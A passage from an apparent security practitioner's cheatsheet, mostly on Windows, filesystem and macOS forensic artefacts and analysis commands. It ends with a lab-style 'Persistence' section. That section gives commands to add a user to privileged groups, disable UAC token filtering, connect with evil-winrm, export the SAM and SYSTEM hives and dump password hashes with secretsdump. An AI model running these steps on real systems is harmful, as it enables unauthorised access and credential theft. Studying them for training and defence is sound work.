Recover a deleted file by a known content pattern (manual carving):

```console
sudo strings -t d /dev/loop0 | grep -i "AAAAAAAA"
echo $((<offset> / <block_size>))
sudo dd if=/dev/loop0 bs=<block_size> skip=<block_number> count=1 of=/tmp/recovered_file
```

Tools: **[debugfs](commands/generalcommands.md#debugfs)** and **extundelete** (CLI); **Autopsy** (GUI, built on The Sleuth Kit) for metadata, deleted-file recovery, and timelines.

### FAT32 Filesystem Analysis

Structure, in disk order: Reserved Area (boot sector, FSInfo sector, backup boot sector) → FAT Area (FAT1 + backup FAT2) → Data Area (root directory + data region).

Key boot sector fields (all little-endian): bytes per sector (offset `0x0B`, usually 512), sectors per cluster (`0x0D`), reserved sectors (`0x0E`), number of FATs (`0x10`), sectors per FAT (`0x24`), root directory starting cluster (`0x2C`). The boot sector ends with the signature `55 AA`.

Root directory entries are 32 bytes each — Short File Name (SFN) entries, optionally preceded by chained Long File Name (LFN) entries:

- Byte `0x00` = `E5` → the entry is **deleted**.
- Byte `0x0B` (attributes): `0x01` = read-only, `0x02` = **hidden**, `0x04` = system, `0x10` = directory, `0x20` = archive.
- Bytes `0x1A`/`0x14` = low/high word of the first cluster; `0x1C` = file size.

FAT32 has no journaling and no permission system, making it a favorite for USB-based attacks (MITRE T1006 Direct Volume Access, T1564.001 Hidden Files and Directories, T1070.004/.006/.009 Indicator Removal). Inspect the attribute byte for hidden files/directories, and cross-check the Created/Modified/Accessed dates in the SFN entry for timestomping anomalies (e.g. an Accessed date with no prior Creation date).

Tools: manual analysis with **HxD**; automated structure/timeline/deleted-file analysis with **Autopsy** — its Timeline view (linear scale) is effective for spotting timestomping outliers across many files at once. Deleted files can also be found directly in a directory listing or in `$RECYCLE.BIN`.

### NTFS Filesystem Analysis

Key system files: `$MFT` (Master File Table — one record per file/directory), `$MFTMirr` (MFT backup), `$LogFile` (transactional journal of metadata changes), `$Bitmap` (allocated/free cluster tracking), `$Boot` (boot sector), `$BadClus` (bad sector tracking — can be abused to hide data), `$UpCase` (case mapping table).

MACB timestamps (stored per MFT record): **M**odified, **A**ccessed, **C**hanged (metadata), **B**irth (created).

Extract and parse the MFT with **[MFTECmd](commands/generalcommands.md#mftecmd)**:

```console
MFTECmd.exe -f ..\Evidence\$MFT --csv ..\Evidence --csvf MFT_record.csv
```

Useful output columns: Entry/Parent Entry Number, Sequence Number (flags reused records), Flags/Entry Flags (file vs directory, hidden/system), **In Use** (record still exists after deletion — the MFT retains deleted entries until reused), Logical vs Physical Size (reveals slack space).

The USN Journal (`$J`, implemented as an ADS inside `$Extend\$UsnJrnl`) records granular file-level change events:

```console
MFTECmd.exe -f ..\Evidence\$J --csv ..\Evidence --csvf USNJrnl.csv
```

| Opcode | Meaning |
|--------|---------|
| USN_REASON_FILE_CREATE | File/directory created |
| USN_REASON_FILE_DELETE | File/directory deleted |
| USN_REASON_DATA_OVERWRITE | Data overwritten |
| USN_REASON_DATA_EXTEND / _TRUNCATION | File grew / shrank |
| USN_REASON_RENAME_OLD_NAME | File renamed (old name recorded) |
| USN_REASON_CLOSE | Handle closed after changes |

`$I30` is the NTFS directory index attribute — it can retain entries for files since deleted, renamed, or moved (a form of slack space):

```console
MFTECmd.exe -f ..\Evidence\$I30 --csv ..\Evidence\ --csvf i30.csv
```

Tools: **FTK Imager** to export `$MFT`/`$LogFile`/`$I30`/`$Extend`/`$UsnJrnl` from a live disk or image; **Timeline Explorer** to browse MFTECmd's CSV output.

### File Carving

File carving recovers files from a disk image based on file headers, footers, and internal structures, rather than relying on filesystem metadata. Useful for recovering deleted files.

Common file signatures (magic bytes):

| File Type | Header | Footer |
|-----------|--------|--------|
| JPEG | `FF D8 FF E0` | `FF D9` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `49 45 4E 44 AE 42 60 82` |
| PDF | `25 50 44 46` (`%PDF`) | `25 25 45 4F 46` (`%%EOF`) |
| DOCX / ZIP | `50 4B 03 04` | `50 4B 05 06` |
| GIF | `47 49 46 38 39 61` / `...38 37 61` | `00 3B` |

First check whether the filesystem still shows files at all — mount the image read-only:

```console
sudo mount -o ro,loop Challenge3_deleted_disk.img /mnt/tmp
```

Scan a disk image for embedded/fragmented file signatures (e.g. in slack space) with **[binwalk](commands/generalcommands.md#binwalk)**:

```console
binwalk Challenge2_slack_space.img
binwalk -e Challenge2_slack_space.img
```

Manually carve a file once its start/end offsets are known (from a hex editor like **Okteta**/**HxD**) using **[dd](commands/generalcommands.md#dd)**:

```console
dd if=Challenge1_Manual_Carve_usb.img of=Image.png bs=1 skip=<start-offset> count=<end-offset minus start-offset>
```

Verify a recovered file's true type and inspect its metadata with **[exiftool](commands/generalcommands.md#exiftool)**:

```console
exiftool Challenge1_Image.png
```

**[foremost](commands/generalcommands.md#foremost)**

```bash
foremost -t pdf,jpg,png -i Challenge3_deleted_disk.img -o Challenge3_files -c /etc/custom_foremost.conf
```
Carve PDF, JPG, and PNG files out of a disk image using a custom configuration file.

**[scalpel](commands/generalcommands.md#scalpel)**

```bash
scalpel Challenge3_deleted_disk.img -o ScalpelOutput -c /etc/scalpel/scalpel.conf
```
Carve files out of a disk image using scalpel's configuration file to define which types to recover.

### Registry Analysis Tools

Several dedicated tools exist to expedite registry analysis during an investigation, each suited to different tasks.

**Registry Explorer** (GUI) allows browsing, searching, and comparing offline registry hives, with a large library of community plugins that decode known keys into human-readable values. It can also repair a "dirty" hive (one with pending, uncommitted changes) by replaying the associated transaction logs before analysis.

**RECmd** (command-line) runs batch definition files against one or more hives to extract specific keys/values in bulk — useful for scripted or repeatable triage across many hosts.

**RegRipper** (command-line/GUI) runs a library of plugins against a hive to extract and report on forensically relevant keys and values, similar in purpose to RECmd but with its own plugin ecosystem.

> **Note:** RegRipper (and RECmd) cannot process a dirty hive. If a hive contains uncommitted transaction log data, it must first be repaired using **Registry Explorer** before running RegRipper or RECmd against it.

### Useful Registry Locations

#### System Info & Accounts

| Artifact | Registry Path |
|----------|----------------|
| OS Version | `SOFTWARE\Microsoft\Windows NT\CurrentVersion` |
| Current Control Set | `HKLM\SYSTEM\CurrentControlSet`, `SYSTEM\Select\Current`, `SYSTEM\Select\LastKnownGood` |
| Computer Name | `SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName` |
| Time Zone Information | `SYSTEM\CurrentControlSet\Control\TimeZoneInformation` |
| Network Interfaces & Past Networks | `SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces` |
| SAM Hive & User Information | `SAM\Domains\Account\Users` |

#### Autostart Programs (Autoruns)

- `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run`
- `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce`
- `SOFTWARE\Microsoft\Windows\CurrentVersion\policies\Explorer\Run`
- `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`

#### File/Folder Usage or Knowledge

| Artifact | Registry Path |
|----------|----------------|
| Recent Files | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs` |
| Office Recent Files | `NTUSER.DAT\Software\Microsoft\Office\<VERSION>\UserMRU\LiveID_####\FileMRU` |
| ShellBags | `USRCLASS.DAT\Local Settings\Software\Microsoft\Windows\Shell\Bags`, `USRCLASS.DAT\...\Shell\BagMRU`, `NTUSER.DAT\Software\Microsoft\Windows\Shell\BagMRU`, `NTUSER.DAT\...\Shell\Bags` |
| Open/Save & LastVisited Dialog MRUs | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU`, `...\ComDlg32\LastVisitedPidlMRU` |
| Windows Explorer Address/Search Bars | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`, `...\Explorer\WordWheelQuery` |

> Some of these overlap with the [Windows User Account Forensics](#windows-user-account-forensics) section above.

#### External/USB Device Forensics

| Artifact | Registry Path |
|----------|----------------|
| Device Identification | `SYSTEM\CurrentControlSet\Enum\USBSTOR`, `SYSTEM\CurrentControlSet\Enum\USB` |
| First/Last Connection Times | `SYSTEM\CurrentControlSet\Enum\USBSTOR\<Ven_Prod_Version>\<USBSerial#>\Properties\{83da6326-97a6-4088-9453-a19231573b29}\####` — value `0064` = first connection, `0066` = last connection, `0067` = last removal |
| USB Device Volume Name | `SOFTWARE\Microsoft\Windows Portable Devices\Devices` |

#### Evidence of Execution

| Artifact | Registry Path |
|----------|----------------|
| UserAssist | `NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count` |
| ShimCache | `SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` |
| AmCache | `Amcache.hve\Root\File\{Volume GUID}\` |
| BAM/DAM | `SYSTEM\CurrentControlSet\Services\bam\UserSettings\{SID}`, `SYSTEM\CurrentControlSet\Services\dam\UserSettings\{SID}` |

🔗 Source: [TryHackMe Windows Forensics 1 cheatsheet](https://tryhackme.com/room/windowsforensics1)

### Scheduled Tasks & Services Analysis

Scheduled tasks and services are common persistence mechanisms; comparing them against known-good baselines helps identify outliers.

#### Relevant Event IDs

**Scheduled Tasks:**

| Event ID | Description |
|----------|-------------|
| 4698 | A scheduled task was created |
| 4702 | A scheduled task was updated |

**Services:**

| Event ID | Description |
|----------|-------------|
| 7045 | A new service was installed (System channel) |
| 4697 | A service was installed in the system (Security channel) |

Read the event logs via PowerShell:

```powershell
Get-WinEvent -FilterHashTable @{LogName='System';ID='7045'} | fl
```

**Task Scheduler Operational log** (`Applications and Services Logs > Microsoft > Windows > TaskScheduler > Operational`) — useful when the Security log has been cleared, since it tracks a task's full lifecycle:

| Event ID | Description |
|----------|-------------|
| 106 | A scheduled task was registered (created) |
| 100 | Task Scheduler launched/started the task |
| 129 | Task Scheduler launched a new action process for the task (includes the executable path/command run) |

Other sources to corroborate a task's lifecycle:

- **Task XML** (`C:\Windows\System32\Tasks`) — gives the task's creation timestamp and its full definition (actions, triggers, run-as account).
- **Task Scheduler GUI** — alternative to reading the XML directly when you have interactive/GUI access to the machine.
- **PowerShell/process-creation logs** — check activity immediately before/after the task's creation time for context on how it was created and what it did when it ran.

#### Enumerating Scheduled Tasks

```powershell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
```
List all enabled scheduled tasks.

```powershell
Get-ScheduledTask | Where-Object {$_.Date -ne $null -and $_.State -ne "Disabled"} | Sort-Object Date | select Date,TaskName,Author,State,TaskPath | ft
```
List all enabled scheduled tasks that have a creation date, sorted by date.

```console
schtasks.exe /query /fo CSV | findstr /V Disabled
```
Native command alternative to list all non-disabled scheduled tasks.

A single script to list all scheduled tasks sorted by their creation date, together with all the significant information:

```powershell
# List all enabled scheduled tasks with creation date and command to be executed, sorted by date and printing all additional information
$tasks = Get-ScheduledTask | Where-Object {$_.Date -ne $null -and $_.State -ne "Disabled" -and $_.Actions.Execute -ne $null} | Sort-Object Date

foreach ($task in $tasks) {
    $taskName = $task.TaskName
    $taskDate = $task.Date
    $taskPath = $task.TaskPath
    $taskAuthor = $task.Author
    $taskCommand = $task.Actions.Execute
    $taskArgs = $task.Actions.Arguments
    $taskRunAs = $task.Principal.UserId

    # Output service information
    Write-Host "Task Name: $taskName"
    Write-Host "Task Author: $taskAuthor"
    Write-Host "Creation Date: $taskDate"
    Write-Host "Task Path: $taskPath"
    Write-Host "Command: $taskCommand $taskArgs"
    Write-Host "Run As: $taskRunAs"
    Write-Host ""
}
```

#### Enumerating Services

```powershell
Get-Service | Where-Object {$_.Status -eq "Running" -and $_.StartType -eq "Automatic"}
```
List all running services set to start automatically.

Add the binary these services execute:

```powershell
$services = Get-Service | Where-Object {$_.Status -eq "Running" -and $_.StartType -eq "Automatic"}

foreach ($service in $services) {
    $serviceName = $service.Name
    $serviceDisplayName = $service.DisplayName
    $serviceStatus = $service.Status
    $serviceWMI = (Get-WmiObject Win32_Service | Where-Object { $_.Name -eq $serviceName })
    $servicePath = $serviceWMI.PathName
    $serviceUser = $serviceWMI.StartName

    Write-Host "Service Name: $serviceName"
    Write-Host "Display Name: $serviceDisplayName"
    Write-Host "Service Status: $serviceStatus"
    Write-Host "Executable Path: $servicePath"
    Write-Host "User Context: $serviceUser"
    Write-Host ""
}
```

Retrieve the Service registry key's Last Write Time using [Get-RegWriteTime.ps1](https://github.com/WiredPulse/PowerShell/blob/master/Registry/Get-RegWriteTime.ps1):

```powershell
powershell.exe -ep bypass
Import-Module C:\Tools\Get-RegWriteTime.ps1; 
$services = Get-Service | Where-Object {$_.Status -eq "Running" -and $_.StartType -eq "Automatic"}

foreach ($service in $services) {
    $serviceName = $service.Name
    $serviceWMI = (Get-WmiObject Win32_Service | Where-Object { $_.Name -eq $serviceName })
    $serviceDisplayName = $service.DisplayName
    $serviceStatus = $service.Status
    $servicePath = $serviceWMI.PathName
    $serviceUser = $serviceWMI.StartName
    $serviceLastWriteTime = Get-Item HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName | Get-RegWriteTime | Select LastWriteTime

    Write-Host "Service Name: $serviceName"
    Write-Host "Display Name: $serviceDisplayName"
    Write-Host "Service Status: $serviceStatus"
    Write-Host "Executable Path: $servicePath"
    Write-Host "User Context: $serviceUser"
    Write-Host "Last Write Time: $serviceLastWriteTime"
    Write-Host ""
}
```

Reviewing stopped services that are still set to run automatically on boot is also essential for spotting outliers (e.g. a service disabled by an attacker to avoid detection):

```powershell
Import-Module C:\Tools\Get-RegWriteTime.ps1;
$services = Get-Service | Where-Object {$_.Status -eq "Stopped" -and $_.StartType -eq "Automatic"}

foreach ($service in $services) {
    $serviceName = $service.Name
    $serviceWMI = (Get-WmiObject Win32_Service | Where-Object { $_.Name -eq $serviceName })
    $serviceDisplayName = $service.DisplayName
    $serviceStatus = $service.Status
    $servicePath = $serviceWMI.PathName
    $serviceUser = $serviceWMI.StartName
    $serviceLastWriteTime = Get-Item HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName | Get-RegWriteTime | Select LastWriteTime

    Write-Host "Service Name: $serviceName"
    Write-Host "Display Name: $serviceDisplayName"
    Write-Host "Service Status: $serviceStatus"
    Write-Host "Executable Path: $servicePath"
    Write-Host "User Context: $serviceUser"
    Write-Host "Last Write Time: $serviceLastWriteTime"
    Write-Host ""
}
```

Services are also recorded in the registry:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
```

### Outlook Forensics

Profiles located in:

```
AppData\Local\Microsoft\Outlook
```

Enumerate each user directory to check for Outlook artefacts:

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Local\Microsoft\Outlook\" 2>$null | findstr Directory}
```

Use **XstReader** to open the `.ost`/`.pst` file (see [tools_and_resources.md](tools_and_resources.md#digital-forensics)).

### Microsoft Teams Forensics

Metadata folder:

```
AppData\Roaming\Microsoft\Teams
```

Enumerate each user directory to check for Teams artefacts:

```powershell
ls C:\Users\ | foreach {ls "C:\Users\$_\AppData\Roaming\Microsoft\Teams" 2>$null | findstr Directory}
```

Use **Forensics.im** (Autopsy plugin) to parse the Teams metadata, or the standalone **ms_teams_parser** binary (see [tools_and_resources.md](tools_and_resources.md#digital-forensics)):

```console
C:\Tools\ms_teams_parser.exe -f C:\Users\mike.myers\AppData\Roaming\Microsoft\Teams\IndexedDB\https_teams.microsoft.com_0.indexeddb.leveldb\ -o output.json
```

View all conversation threads and file attachment details from the resulting JSON file:

```powershell
$teams_metadata = cat .\output.json | ConvertFrom-Json
$users = @{}
$messages = @{}

# Initialise user hashtable for correlation
foreach ($data in $teams_metadata) {
   if ($data.record_type -eq "contact") {
     $users.add($data.mri, $data.userPrincipalName)
   }
}

# Combine all conversations/messages with the same ID
foreach ($data in $teams_metadata) {
  if ($data.record_type -eq "message") {
    if ($messages.keys -notcontains $data.conversationId) {
      $messages[$data.conversationId] = [System.Collections.ArrayList]@()
    }
    $messages[$data.conversationId].add($data) > $null
  }
}

# Print the parsed output focused on the significant values
foreach ($conversationID in $messages.keys) {
  Write-Host "Conversation ID: $conversationID`n"
  $conversation = $messages[$conversationID] | Sort createdTime
  foreach ($message in $conversation) {
    $createdTime = $message.createdTime
    $fromme = $message.isFromMe
    $content = $message.content
    $sender = $users[$message.creator]
    $direction = if ($message.isFromMe) { 'Outbound' } else { 'Inbound' }
    $attachments = if ($message.properties.files) { 'True' } else {'False'}

    Write-Host "Created Time: $createdTime"
    Write-Host "Sent by: $sender"
    Write-Host "Direction: $direction"
    Write-Host "Message content: $content"
    Write-Host "Has attachment: $attachments"
    
    # Parse file attachment details
    if ($attachments -eq "True") {
      foreach ($attachment in $message.properties.files) {
        $filename = $attachment.fileName
        $location = $attachment.fileInfo.fileUrl
        $type = $attachment.fileType
        
        Write-Host "Attachment name: $filename"
        Write-Host "Attachment location: $location"
        Write-Host "Attachment type: $type"
      }
    }
    Write-Host "`n"
  }

  Write-host "----------------`n"
}
```

List only messages containing attachments:

```powershell
$teams_metadata = cat .\output.json | ConvertFrom-Json
$users = @{}
$messages = @{}
# Initialise user hashtable for correlation
foreach ($data in $teams_metadata) {
   if ($data.record_type -eq "contact") {
     $users.add($data.mri, $data.userPrincipalName)
   }
}
# Combine all conversations/messages with the same ID
foreach ($data in $teams_metadata) {
  if ($data.record_type -eq "message") {
    if ($messages.keys -notcontains $data.conversationId) {
      $messages[$data.conversationId] = [System.Collections.ArrayList]@()
    }
    $messages[$data.conversationId].add($data) > $null
  }
}
# Print only conversations that contain attachment messages
foreach ($conversationID in $messages.keys) {
  $conversation = $messages[$conversationID] |
      Where-Object { $_.properties.files } |
      Sort createdTime

  if (-not $conversation) { continue }   # no attachments in this convo

  Write-Host "Conversation ID: $conversationID`n"
  foreach ($message in $conversation) {
    $createdTime = $message.createdTime
    $fromme = $message.isFromMe
    $content = $message.content
    $sender = $users[$message.creator]
    $direction = if ($message.isFromMe) { 'Outbound' } else { 'Inbound' }
    $attachments = 'True'
    Write-Host "Created Time: $createdTime"
    Write-Host "Sent by: $sender"
    Write-Host "Direction: $direction"
    Write-Host "Message content: $content"
    Write-Host "Has attachment: $attachments"
    # Parse file attachment details
    foreach ($attachment in $message.properties.files) {
      $filename = $attachment.fileName
      $location = $attachment.fileInfo.fileUrl
      $type = $attachment.fileType
      Write-Host "Attachment name: $filename"
      Write-Host "Attachment location: $location"
      Write-Host "Attachment type: $type"
    }
    Write-Host "`n"
  }
  Write-host "----------------`n"
}
```

List only messages containing URLs:

```powershell
$teams_metadata = cat .\output.json | ConvertFrom-Json
$users = @{}
$messages = @{}
# Initialise user hashtable for correlation
foreach ($data in $teams_metadata) {
   if ($data.record_type -eq "contact") {
     $users.add($data.mri, $data.userPrincipalName)
   }
}
# Combine all conversations/messages with the same ID
foreach ($data in $teams_metadata) {
  if ($data.record_type -eq "message") {
    if ($messages.keys -notcontains $data.conversationId) {
      $messages[$data.conversationId] = [System.Collections.ArrayList]@()
    }
    $messages[$data.conversationId].add($data) > $null
  }
}
# Print only messages whose content contains a URL
foreach ($conversationID in $messages.keys) {
  $conversation = $messages[$conversationID] |
      Where-Object { $_.content -match 'https?://' } |
      Sort createdTime

  if (-not $conversation) { continue }   # no URLs in this convo

  Write-Host "Conversation ID: $conversationID`n"
  foreach ($message in $conversation) {
    $createdTime = $message.createdTime
    $fromme = $message.isFromMe
    $content = $message.content
    $sender = $users[$message.creator]
    $direction = if ($message.isFromMe) { 'Outbound' } else { 'Inbound' }

    # extract the URL(s) for easy reading
    $urls = [regex]::Matches($content, 'https?://[^\s"''<>]+') |
            ForEach-Object { $_.Value }

    Write-Host "Created Time: $createdTime"
    Write-Host "Sent by: $sender"
    Write-Host "Direction: $direction"
    Write-Host "Message content: $content"
    Write-Host "URLs found: $($urls -join ', ')"
    Write-Host "`n"
  }
  Write-host "----------------`n"
}
```

### OneDrive Forensics

Artifact folder:

```
AppData\Local\Microsoft\OneDrive\logs
```

Interesting files:

- `SyncEngine.odl`
- `SyncDiagnostics.log`

Open these files with **OneDriveExplorer** — https://github.com/Beercow/OneDriveExplorer

### System Resource Usage Monitor (SRUM)

SRUM tracks application, network, and resource usage history, stored in:

```
C:\Windows\System32\sru\SRUDB.dat
```

Extract it using KAPE:

```console
.\kape.exe --tsource C:\Windows\System32\sru --tdest C:\Users\CMNatic\Desktop\SRUM --tflush --mdest C:\Users\CMNatic\Desktop\MODULE --mflush --module SRUMDump --target SRUM
```

Analyse it with **srum-dump** (https://github.com/MarkBaggett/srum-dump).

### Windows Firewall Logs

Log file location:

```
C:\Windows\System32\LogFiles\Firewall\pfirewall.log
```

Or read via PowerShell:

```powershell
gc C:\Windows\System32\LogFiles\Firewall\pfirewall.log | more
```

### Network Connection Analysis

Show TCP connections and associated processes:

```powershell
Get-NetTCPConnection | select LocalAddress,localport,remoteaddress,remoteport,state,@{name="process";Expression={(get-process -id $_.OwningProcess).ProcessName}}, @{Name="cmdline";Expression={(Get-WmiObject Win32_Process -filter "ProcessId = $($_.OwningProcess)").commandline}} | sort Remoteaddress -Descending | ft -wrap -autosize
```

Show UDP connections:

```powershell
Get-NetUDPEndpoint | select local*,creationtime, remote* | ft -autosize
```

Sort and get unique remote IPs:

```powershell
(Get-NetTCPConnection).remoteaddress | Sort-Object -Unique
```

Investigate a specific IP address:

```powershell
Get-NetTCPConnection -remoteaddress 51.15.43.212 | select state, creationtime, localport,remoteport | ft -autosize
```

Retrieve the DNS cache:

```powershell
Get-DnsClientCache | ? Entry -NotMatch "workst|servst|memes|kerb|ws|ocsp" | out-string -width 1000
```

View the hosts file:

```powershell
gc -tail 4 "C:\Windows\System32\Drivers\etc\hosts"
```

Query active RDP sessions:

```powershell
qwinsta
```

Query SMB shares:

```powershell
Get-SmbConnection
Get-SmbShare
```

### Alternate Windows Log Sources

When the Security event log has been cleared or an attacker has otherwise tampered with primary logging, these secondary sources can still reveal what happened.

#### Web Access Logs

| Server | Log Location |
|--------|---------------|
| Apache | `C:\Apache24\logs` |
| IIS | `C:\inetpub\logs\LogFiles\<WEBSITE>` |

#### PowerShell Logs

| Source | Location |
|--------|----------|
| Console history | `%AppData%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` |
| Windows PowerShell (classic channel) | `Event Viewer > Applications and Services Logs > Windows PowerShell` — Event ID 600 (a PowerShell provider was started, evidence PowerShell ran even if history/logs were cleared) |
| ScriptBlock Logging | `Event Viewer > Applications and Services Logs > Microsoft > Windows > PowerShell > Operational` — Event ID 4104 (records the actual script block/command content executed) |

#### RDP Session Logs

| Event ID | Log Channel | Description |
|----------|-------------|-------------|
| 4624 | Security | An account successfully logged on (Logon Type 10 = RemoteInteractive for RDP) |
| 4625 | Security | An account failed to log on |
| 21 | TerminalServices-LocalSessionManager/Operational | Remote Desktop session logon succeeded |
| 24 | TerminalServices-LocalSessionManager/Operational | Session has been disconnected |
| 25 | TerminalServices-LocalSessionManager/Operational | Session reconnection succeeded |

#### Windows Defender Logs

`Event Viewer > Applications and Services Logs > Microsoft > Windows > Windows Defender > Operational`

| Event ID | Description |
|----------|-------------|
| 1116 | Malware or potentially unwanted software was detected |
| 1117 | An action was taken to remediate the detected threat (or "Allow" if not remediated per configured policy) |
| 5001 | Real-time protection was disabled |
| 5007 | Antimalware configuration changed (e.g. an exclusion added) — a possible evasion signal, worth checking what was excluded |
| 5013 | Tamper Protection blocked an attempted change to Defender's settings |

Detection history is also stored on disk at:

```
C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\DetectionHistory\
```

### macOS Artefact Types

macOS forensic data is typically found in one of three formats:

- **Plists** (`.plist`) — parse with **[plutil / plistutil](commands/generalcommands.md#plutil--plistutil)**: `plutil` on a Mac, `plistutil -p <file>` on Linux/Windows.
- **SQLite databases** — browse/query with **DB Browser for SQLite**. Use **[APOLLO](commands/generalcommands.md#apollo)** to run its library of curated SQL modules against known databases (e.g. `knowledgeC.db`) to know what's worth extracting.
- **Logs**:
  - Apple System Logs (ASL) — `/private/var/log/asl/`. On a Mac: `open -a Console /private/var/log/asl/<log>.asl`. On Linux/Windows: **[mac_apt](commands/generalcommands.md#mac_apt)**.
  - System log — `/private/var/log/system.log` (plain text; rotates to `.gz`). Search all rotated logs in one pass with **[zgrep](commands/generalcommands.md#zgrep)**.
  - Unified logs — `/private/var/db/diagnostics/*.tracev3` and `/private/var/db/uuidtext`. On a Mac: **[log show](commands/generalcommands.md#log-macos)** (supports `--predicate` filtering by subsystem/category/message). On Linux/Windows: mac_apt or Mandiant's **[unifiedlog_parser](commands/generalcommands.md#unifiedlog_parser)**.

### macOS System Information

| Artefact | Location |
|----------|----------|
| OS version | `/System/Library/CoreServices/SystemVersion.plist` (requires mounting the System volume, not the Data volume) |
| Serial number | `TableInfo` table in `consolidated.db` or `cache_encryptedA.db`, under `/private/var/folders/*/<DARWIN_USER_DIR>/C/locationd/` |
| OS install time | `stat -x /private/var/db/.AppleSetupDone`, or `/private/var/db/softwareupdate/journal.plist` |
| Time zone | `/etc/localtime` (`ls -la /etc/localtime`); also `/Library/Preferences/.GlobalPreferences.plist` |
| Location Services active? | `/Library/Preferences/com.apple.timezone.auto.plist` |
| Boot / reboot / shutdown times | `/private/var/log/system.log` — `zgrep BOOT_TIME system.log*` / `zgrep SHUTDOWN_TIME system.log.*`; also visible in Unified Logs filtered on `loginwindow` |

Boot/shutdown check via Unified Logs (on a Mac):

```console
log show --info --predicate 'eventMessage contains "com.apple.system.loginwindow" and eventMessage contains "SessionAgentNotificationCenter"'
```

### macOS Network Information

| Artefact | Location |
|----------|----------|
| Network interfaces | `/Library/Preferences/SystemConfiguration/NetworkInterfaces.plist` |
| DHCP settings | `/private/var/db/dhcpclient/leases/<interface>.plist` (e.g. `en0.plist`) |
| Known wireless networks | `/Library/Preferences/com.apple.wifi.known-networks.plist` |

Network usage on a live system:

```console
log show --info --predicate 'senderImagePath contains "IPConfiguration" and (eventMessage contains "SSID" or eventMessage contains "Lease" or eventMessage contains "network changed")'
```

Network usage from an offline/non-live Mac (exported logarchive), via **[unifiedlog_parser](commands/generalcommands.md#unifiedlog_parser)**:

```console
./unifiedlog_parser -i system_logs.logarchive -o logs/output1.csv
```

### macOS Account Activity

| Artefact | Location |
|----------|----------|
| User accounts & password info | `/private/var/db/dslocal/nodes/Default/users/<user>.plist` |
| Last logged-in user | `/Library/Preferences/com.apple.loginwindow.plist` |
| SSH known hosts | `/Users/<user>/.ssh/known_hosts` |
| Accounts/groups with sudo privilege | `/etc/sudoers` |
| Login/logout events | `system.log` (`zgrep login system.log*`); ASL via mac_apt (`grep USER_PROCESS asl_ver2.csv`) |
| Screen lock/unlock events | Unified Logs / mac_apt output — filter for `com.apple.sessionagent.screenIsLocked` / `...screenisUnlocked` |

### macOS Evidence of Execution

Terminal history:

```
/Users/<user>/.zsh_history          (or .bash_history, if used)
/Users/<user>/.zsh_sessions/<GUID>
```

Application usage is tracked in the `knowledgeC.db` database — per-user at `~/Library/Application Support/Knowledge/knowledgeC.db`, system-wide at `/private/var/db/CoreDuet/Knowledge/knowledgeC.db`. Query it directly in DB Browser for SQLite, or with **[APOLLO](commands/generalcommands.md#apollo)** modules:

- `knowledge_app_usage` — parses the `/app/usage` stream (start/end times per application).
- `knowledge_app_intents` — parses `/app/intents` (in-app activity, e.g. sending a WhatsApp message).

A second, similar source of application usage data: `CurrentPowerlog.PLSQL` at `/private/var/db/powerlog/Library/BatteryLife/CurrentPowerlog.PLSQL`.

### macOS File System Activity

FSEvents store — analogous to the NTFS USN Journal, keeps records of filesystem changes:

```
/System/Volumes/Data/.fseventsd
```

```console
python3 mac_apt.py -o . -c DMG ~/mac-disk.img FSEVENTS
sudo python3 mac_apt.py -o . -c MOUNTED / FSEVENTS
```

`.DS_Store` files (per-folder Finder metadata; can retain the names of items no longer present) — parse with the **[DS_Store Parser](commands/generalcommands.md#ds_store-parser)**:

```console
python3 DS_Store-parser/parse.py ../.DS_Store
```

Most Recently Used (MRU) items:

| Application | Location | Key |
|-------------|----------|-----|
| Finder | `/Users/<user>/Library/Preferences/com.apple.finder.plist` | `FXRecentFolders` (item 0 = most recent) |
| Microsoft apps | `/Users/<user>/Library/Containers/com.microsoft.<app>/Data/Library/Preferences/com.microsoft.<app>.securebookmarks.plist` | — |

### macOS Connected Devices

| Artefact | Location |
|----------|----------|
| Mounted volumes (USB drives, DMG/IMG images) | `com.apple.finder.plist` → `FXDesktopVolumesPositions` key |
| Connected iDevices | `/Users/<user>/Library/Preferences/com.apple.iPod.plist` |
| Bluetooth connections (historical) | `knowledgeC.db` → `/Bluetooth/isConnected` stream — extract with APOLLO's `knowledge_audio_bluetooth_connected` module |
| Connected/used printers | `/Users/<user>/Library/Preferences/org.cups.PrintingPrefs.plist` |

## Misc



## Persistence

### Linux

### Windows

#### **Tampering With Unprivileged Accounts**
	
##### *Assign Group Memberships*
	
- Make user part of Administrators group.

```cmd
net localgroup "Administrators" thmuser1 /add
```

- If thats to suspicious, add to Backup Operators group and Remote Management for RDP.

```cmd
net localgroup "Backup Operators" thmuser1 /add
net localgroup "Remote Management Users" thmuser1 /add
```

- Disable UAC privilige stripping for remote users.

```cmd
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- Remote into the machine (RDP or Evil-WinRM)

```console
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```

- Export and download SAM and SYSTEM registry hives.

```console
reg save hklm\system system.bak
reg save hklm\sam sam.bak

download system.bak
download sam.bak
```

- Dump hashes from SAM and SYSTEM hives.

```console
python /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- Pass the hash with admin account.

```console
